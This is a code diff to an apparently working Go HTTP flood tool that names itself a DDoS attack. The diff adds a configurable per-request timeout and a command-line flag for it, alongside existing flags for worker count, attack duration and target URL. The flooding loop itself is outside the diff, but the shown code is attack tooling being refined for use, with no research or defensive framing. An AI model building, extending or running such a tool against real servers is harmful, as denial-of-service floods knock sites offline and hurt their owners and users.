@@ -17,6 +17,7 @@ import (
 type DDoS struct {
     url           string
     headers       map[string]string
+    timeout       time.Duration
     stop          *chan bool
     amountWorkers int
 
@@ -26,7 +27,7 @@ type DDoS struct {
 }
 
 // New - initialization of new DDoS attack
-func New(URL string, workers int, Headers map[string]string) (*DDoS, error) {
+func New(URL string, workers int, Headers map[string]string, Timeout time.Duration) (*DDoS, error) {
     if workers < 1 {
         return nil, fmt.Errorf("Amount of workers cannot be less 1")
     }
@@ -39,6 +40,7 @@ func New(URL string, workers int, Headers map[string]string) (*DDoS, error) {
     return &DDoS{
         url:           URL,
         headers:       Headers,
+        timeout:       Timeout, 
         stop:          &s,
         amountWorkers: workers,
     }, nil
@@ -92,14 +94,16 @@ func main() {
 
     workers := flag.Int("w", 100, "worker num")
     targetUrl := flag.String("u", "http://127.0.0.1:80", "target url")
-    workTime := flag.Int("t", 1, "how many  seconds attack keep")
+    workTime := flag.Int("t", 1, "how many seconds attack keep")
+    timeOutCnt := flag.Int("to", 1, "fasthttp do timeout")
     jsonConfig := flag.String("hc", "", "headers json congfig file path")
     flag.Parse()
 
     log.Println("start ~~~")
-    log.Printf("worker | %d\n", *workers)
-    log.Printf("target | %s", *targetUrl)
-    log.Printf("keep   | %d Seconds\n", *workTime)
+    log.Printf("worker  | %d\n", *workers)
+    log.Printf("target  | %s", *targetUrl)
+    log.Printf("keep    | %d Seconds\n", *workTime)
+    log.Printf("timeout | %d Seconds\n", *timeOutCnt)
 
     headers := make(map[string]string)
 
@@ -114,8 +118,8 @@ func main() {
             log.Print(k, v)
         }
     }
-    
-    d, err := New(*targetUrl, *workers, headers)
+
+    d, err := New(*targetUrl, *workers, headers, time.Duration(*timeOutCnt) * time.Second)
     if err != nil {
         panic(err)
     }
@@ -124,5 +128,4 @@ func main() {
     d.Stop()
     fmt.Println(d.Result())
     fmt.Println("DDoS attack finish")
-    // Output: DDoS attack server: http://127.0.0.1:80
 }
